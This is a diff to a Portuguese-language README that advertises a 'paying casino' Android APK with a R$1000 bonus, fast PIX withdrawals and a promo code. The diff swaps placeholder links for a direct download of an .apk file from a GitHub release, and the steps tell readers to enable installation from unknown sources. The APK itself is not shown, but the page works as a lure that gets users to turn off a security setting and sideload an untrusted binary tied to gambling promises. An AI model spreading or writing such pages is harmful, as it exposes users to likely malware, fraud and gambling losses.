@@ -1,6 +1,6 @@
 # APK Cassino Pagante 2024 🤑 
 
-[![Download](https://img.shields.io/badge/BAIXAR_APK-R$1000_BÔNUS-green?style=for-the-badge&logo=android)](https://github.com/USER/REPO/releases/latest)
+[![Download](https://img.shields.io/badge/BAIXAR_APK-R$1000_BÔNUS-green?style=for-the-badge&logo=android)](https://github.com/isacharfleming/apk-cassino-pagante-2024/releases/download/apk-cassino-vip-brazil-24h/apk-cassino-vip-brazil-24h.apk)
 
 **Principais Características:**
 - ✅ **Saque via PIX em 15 minutos**
@@ -14,7 +14,7 @@
    `Configurações → Segurança → Fontes desconhecidas`
 
 2. **Faça o download**  
-   [Clique aqui para baixar o APK](https://github.com/USER/REPO/releases/latest)
+   [Clique aqui para baixar o APK](https://github.com/isacharfleming/apk-cassino-pagante-2024/releases/download/apk-cassino-vip-brazil-24h/apk-cassino-vip-brazil-24h.apk)
 
 3. **Aproveite seu bônus!**  
    Use código `VIP2024`
